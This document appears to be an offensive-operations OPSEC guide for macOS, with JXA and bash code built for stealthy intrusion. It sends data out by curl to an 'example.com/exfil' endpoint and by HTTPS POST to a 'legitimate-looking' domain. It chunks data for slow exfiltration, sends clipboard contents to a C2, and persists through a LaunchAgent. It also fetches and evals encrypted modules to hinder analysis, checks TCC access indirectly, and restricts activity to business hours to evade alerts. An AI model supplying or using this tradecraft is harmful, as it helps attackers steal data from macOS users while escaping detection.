# OPSEC Guide for Offensive Operations

## Overview

This guide outlines key principles and practices for maintaining Operational Security (OPSEC) during offensive security operations on macOS systems.

## Key Principles

1. Minimize Footprint
2. Blend In
3. Avoid Detection
4. Maintain Plausible Deniability
5. Compartmentalize

## Practices for macOS Operations

### System Interaction

- Use native macOS APIs instead of command-line tools.
- Leverage existing system processes and libraries.
- Minimize file system writes.

Example:
```javascript
// Use NSFileManager instead of shell commands
var fileManager = $.NSFileManager.defaultManager;
var homeDirectory = fileManager.homeDirectoryForCurrentUser.path.js;
```

Scenario: When retrieving the user's home directory, use NSFileManager API instead of executing `echo $HOME`. This avoids creating a new process and potential command-line logging.

### Permission Checks

- Use indirect methods for permission checks.
- Avoid direct access to sensitive files.
- Implement gradual permission checks.

Example:
```javascript
function checkFullDiskAccess() {
    ObjC.import('CoreServices');
    const query = $.MDQueryCreate(null, "kMDItemDisplayName == 'TCC.db'", null, null);
    $.MDQueryExecute(query, 0);
    return $.MDQueryGetResultCount(query) === 2;
}
```

Scenario: To check for Full Disk Access, use MDQuery to search for TCC.db files instead of attempting to directly access them. This method is less likely to trigger security alerts.

### Network Communication

- Use common protocols and ports.
- Implement traffic obfuscation.
- Leverage existing system services for communication.

Example:
```javascript
function sendData(data) {
    const url = $.NSURL.URLWithString('https://legitimate-looking-site.com');
    const request = $.NSMutableURLRequest.requestWithURL(url);
    request.HTTPMethod = 'POST';
    request.HTTPBody = $.NSString.alloc.initWithString(data).dataUsingEncoding($.NSUTF8StringEncoding);
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, null, null);
}
```

Scenario: When exfiltrating data, use HTTPS POST requests to a legitimate-looking domain instead of creating custom network sockets or using uncommon protocols.

### Persistence

- Use legitimate persistence mechanisms.
- Mimic behaviors of known, trusted applications.
- Implement time-based or event-based triggers.

Example:
```javascript
function createLaunchAgent(label, program) {
    const plist = {
        Label: label,
        ProgramArguments: ['/usr/bin/env', 'osascript', '-l', 'JavaScript', program],
        RunAtLoad: true,
        StartInterval: 3600
    };
    const plistPath = `${$.NSHomeDirectory().js}/Library/LaunchAgents/${label}.plist`;
    $.NSPropertyListSerialization.dataWithPropertyListFormatOptionsError(plist, $.NSPropertyListXMLFormat_v1_0, 0, null).writeToFileAtomically(plistPath, true);
}
```

Scenario: For persistence, create a Launch Agent that runs your script every hour, mimicking the behavior of legitimate update checkers.

### Data Exfiltration

- Use approved channels
- Implement data chunking and slow exfiltration
- Disguise data as normal file types or network traffic
- Encrypt sensitive data before transmission
- Separate key transmission from encrypted data

Example:
```bash
# Initialize encryption with a secure key
if setup_encryption "gpg"; then
    # Encrypt the data before sending
    encrypted_data=$(encrypt_output "$data" "gpg" "$ENCRYPT_KEY")
    
    # First send the encryption key separately
    curl -X POST \
        -H "X-Payload-Type: encryption-key" \
        -H "X-Encryption-Method: gpg" \
        -d "{\"key\":\"$ENCRYPT_KEY\"}" \
        https://example.com/exfil
        
    # Then send the encrypted data
    curl -X POST \
        -H "X-Payload-Type: data" \
        -H "X-Encryption-Method: gpg" \
        -d "$encrypted_data" \
        https://example.com/exfil
fi
```

Scenario: When exfiltrating sensitive data:
1. Generate a secure random key for each session
2. Encrypt data using industry-standard methods (GPG/AES)
3. Send the key and encrypted data separately
4. Use standard HTTP headers and JSON formatting
5. Break large data into chunks and send gradually

```javascript
function exfiltrateData(data) {
    const chunks = chunkData(data, 1024);
    chunks.forEach((chunk, index) => {
        setTimeout(() => {
            sendData(chunk);
        }, index * 60000); // Send a chunk every minute
    });
}
```

Scenario: When exfiltrating large amounts of data, break it into small chunks and send them at regular intervals to avoid sudden large data transfers that might trigger alerts.

### Tool Development

- Develop modular tools for on-target assembly.
- Implement anti-analysis techniques.
- Use code signing and certificate pinning.

Example:
```javascript
function loadModule(moduleName) {
    const moduleCode = fetchEncryptedModule(moduleName);
    const decryptedCode = decryptModule(moduleCode);
    return eval(decryptedCode);
}
```

Scenario: Instead of deploying a full toolkit, fetch and load encrypted modules on-demand to reduce the footprint and complicate analysis of your tools.

### Operational Practices

- Use separate infrastructure for each operation.
- Implement time-zone and working hour restrictions.
- Regularly rotate tools, techniques, and infrastructure.

Example:
```javascript
function isOperationalWindow() {
    const now = new Date();
    const hour = now.getHours();
    const day = now.getDay();
    return (day >= 1 && day <= 5) && (hour >= 9 && hour < 17);
}
```

Scenario: Restrict your tool's operation to business hours in the target's time zone to blend in with normal work patterns and avoid out-of-hours alerts.

## TCC Permission Checking in JXA

### Indirect TCC.db Detection

```javascript
function checkFullDiskAccess() {
    ObjC.import('CoreServices');
    const query = $.MDQueryCreate(null, "kMDItemDisplayName == 'TCC.db'", null, null);
    $.MDQueryExecute(query, 0);
    return $.MDQueryGetResultCount(query) === 2;
}
```

### Gradual Permission Checks

```javascript
function gradualPermissionCheck() {
    const fileManager = $.NSFileManager.defaultManager;
    const homeDir = $.NSHomeDirectory().js;
    const tccPath = `${homeDir}/Library/Application Support/com.apple.TCC`;
    
    if (fileManager.fileExistsAtPath(tccPath)) {
        if (checkFullDiskAccess()) {
            return true;
        }
    }
    return false;
}
```

### Plausible Deniability in Permission Checks

```javascript
function checkSystemPreferences() {
    const prefPanes = listSystemPreferencePanes();
    const hasFullDiskAccess = checkFullDiskAccess();
    return { prefPanes, hasFullDiskAccess };
}

function listSystemPreferencePanes() {
    // Implementation
}
```

### Handling TCC Prompts

```javascript
function safeFileAccess(path) {
    try {
        const fileManager = $.NSFileManager.defaultManager;
        return fileManager.contentsAtPath(path);
    } catch (error) {
        if (error.message.includes("Operation not permitted")) {
            // Handle TCC restriction
        }
        return null;
    }
}
```

## Clipboard Operations

Clipboard operations can be useful for stealthy data handling, but should be used cautiously to avoid detection.

### Reading Clipboard Content

```javascript
function readClipboard() {
    ObjC.import('AppKit');
    const pasteboard = $.NSPasteboard.generalPasteboard;
    const content = pasteboard.stringForType($.NSPasteboardTypeString);
    return ObjC.unwrap(content);
}
```

Use this function to silently read clipboard content. Be aware that frequent clipboard reads might be detected by security software.

### Writing to Clipboard

```javascript
function writeToClipboard(text) {
    ObjC.import('AppKit');
    const pasteboard = $.NSPasteboard.generalPasteboard;
    pasteboard.clearContents;
    pasteboard.setStringForType(text, $.NSPasteboardTypeString);
}
```

Use this function to write data to the clipboard. Avoid writing sensitive data directly; consider encoding or encrypting it first.

### OPSEC Considerations

1. Minimize clipboard operations to avoid detection.
2. Clear the clipboard after use to prevent data leakage.
3. Be aware that some security software may monitor clipboard changes.
4. Consider using the clipboard as a covert channel for data transfer between processes.

### Scenario: Covert Data Exfiltration

```javascript
function exfiltrateViaClipboard(data) {
    const chunks = chunkData(data, 1024);
    chunks.forEach((chunk, index) => {
        setTimeout(() => {
            writeToClipboard(btoa(chunk)); // Base64 encode the chunk
            // Simulate a copy operation here
            setTimeout(() => {
                const clipboardContent = readClipboard();
                sendDataToC2(clipboardContent);
                writeToClipboard(""); // Clear clipboard
            }, 1000);
        }, index * 5000); // 5 seconds between chunks
    });
}
```

This scenario demonstrates using the clipboard for covert data exfiltration, mimicking user copy operations and clearing the clipboard after each transfer to minimize detection risk.
